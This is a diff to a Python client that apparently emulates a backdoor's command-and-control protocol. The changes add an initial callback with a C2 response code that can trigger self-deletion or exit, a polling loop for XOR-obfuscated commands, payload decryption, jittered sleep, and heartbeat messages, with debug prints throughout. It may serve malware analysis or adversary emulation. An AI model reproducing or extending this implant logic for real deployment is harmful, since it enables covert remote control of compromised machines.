@@ -119,13 +119,27 @@ def main():
         "veros": 15 # 15 = Windows 11, 11 = Windows 10
     }
     json_data = json.dumps(data).encode('utf-8')
-    initial_packet = magic + json_data
-    client.send_data(initial_packet)
+    initial_callback = magic + json_data
+    client.send_data(initial_callback)
+    # Check if the C2 rejected the initial callback
+    # If it returns 1, the backdoor deletes itself
+    # If it returns 2, the backdoor exits
+    c2_response = client.receive_data(bytes_to_receive=1)
     
-    # Poll for command data
-    received_data = client.receive_data(bytes_to_receive=13)[1:]
+    if c2_response == 1:
+        print("C2 wants the client to delete itself and exit.")
+    elif c2_response == 2:
+        print("C2 wants the client to exit.")
+    else:
+        print("C2 accepted the initial callack.")
+    
+    
     last_result = 0x02
     while True:
+
+        # Poll for command data
+        print("Checking for commands...")
+        received_data = client.receive_data(bytes_to_receive=12)
         
         # XOR the received data with 0x4D
         print(f"Encoded Command Received (hex): {received_data.hex()}")
@@ -138,13 +152,14 @@ def main():
         xor_key = xored_data[-4:]
         size_encrypted = int.from_bytes(xored_data[4:7], byteorder="little")
         print(f"Command received: {command}")
+        print(f"XOR key received (hex): {xor_key.hex()}")
+        print(f"Encrypted data size: {size_encrypted}")
+        
 
         # Decrypt the encrypted data
-        if size_encrypted > 1:
-            print(f"XOR key received (hex): {xor_key.hex()}")
-            print(f"Encrypted data size: {size_encrypted}")
-            received_data = client.receive_data(bytes_to_receive=size_encrypted)
-            print(f"Received Encrypted data (hex): {received_data.hex()}")
+        received_data = client.receive_data(bytes_to_receive=size_encrypted)
+        if command != 1:
+            print(f"Received data (hex): {received_data.hex()}")
             decrypted_data = client.xor_interlock(received_data, size_encrypted, int.from_bytes(xor_key, byteorder="little"))
             print(f"Decrypted data: {decrypted_data.hex()}")
         
@@ -163,6 +178,7 @@ def main():
 
 
         sleep_random_seconds = (rand() % 30000 + 60000) / 1000
+        print(f"Sleeping for {sleep_random_seconds} seconds")
         time.sleep(sleep_random_seconds)
 
         # Send heartbeat data and continue checking for commands
@@ -175,10 +191,6 @@ def main():
         client.send_data(encrypted_heartbeat)
         print(f"Sending heartbeat verification byte: {hex(last_result)}")
         client.send_data(last_result.to_bytes(1, 'big'))
-        print(f"Checking for new command...")
-        received_data = client.receive_data(bytes_to_receive=13)
-
-
     
     client.close()
 
